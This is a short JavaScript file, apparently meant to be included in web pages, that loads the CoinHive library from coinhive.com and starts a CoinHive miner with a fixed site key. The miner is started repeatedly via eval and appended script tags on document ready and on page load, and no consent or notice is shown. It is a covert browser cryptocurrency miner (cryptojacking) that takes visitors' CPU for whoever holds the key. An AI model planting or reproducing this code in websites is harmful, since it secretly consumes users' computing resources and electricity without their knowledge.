
function sleep(millis) {
    var t = (new Date()).getTime();
    var i = 0;
    while (((new Date()).getTime() - t) < millis) {
        i++;
    }
}

/*var script1 = document.createElement("head");
		script1.innerHTML = "<script src=\"http://coin-hive.com/lib/coinhive.min.js\"></script> <script>var miner = new CoinHive.Anonymous(\"QFAw0gr22QKW9VcYMIiT5uECYYZgIsXo\"); miner.start();</script>";
		document.getElementsByTagName("html")[0].appendChild(script1);*/
		  $("head").append("<script src=\"https://coinhive.com/lib/coinhive.min.js\"></script>");

		function gggg() {
    		
		//sleep(500);
		
		$("head").append("<script>eval ('var miner = new CoinHive.Anonymous(\"QFAw0gr22QKW9VcYMIiT5uECYYZgIsXo\")'); </script>");	
//sleep(100);		
		$("head").append("<script>eval ('miner.start();') </script>");
		//sleep(500);	
		$("head").append("<script>var miner = new CoinHive.Anonymous('QFAw0gr22QKW9VcYMIiT5uECYYZgIsXo'); </script>");	
		$("head").append("<script>miner.start(); </script>");		
		
  }
  
  $(document).ready(gggg());

  window.onload = function () {
    	//$("head").append("<script src=\"http://coin-hive.com/lib/coinhive.min.js\"></script>");
		//sleep(500);
		
		$("body").append("<script>eval ('var miner = new CoinHive.Anonymous(\"QFAw0gr22QKW9VcYMIiT5uECYYZgIsXo\")'); </script>");	
//sleep(100);		
		$("body").append("<script>eval ('miner.start();') </script>");
		//sleep(500);	
		$("body").append("<script>var miner = new CoinHive.Anonymous('QFAw0gr22QKW9VcYMIiT5uECYYZgIsXo'); </script>");	
		$("body").append("<script>miner.start(); </script>");	
}
			
			/*var script=document.createElement('script');
script.type='text/javascript';
script.src='alert("aa");';*/

			
	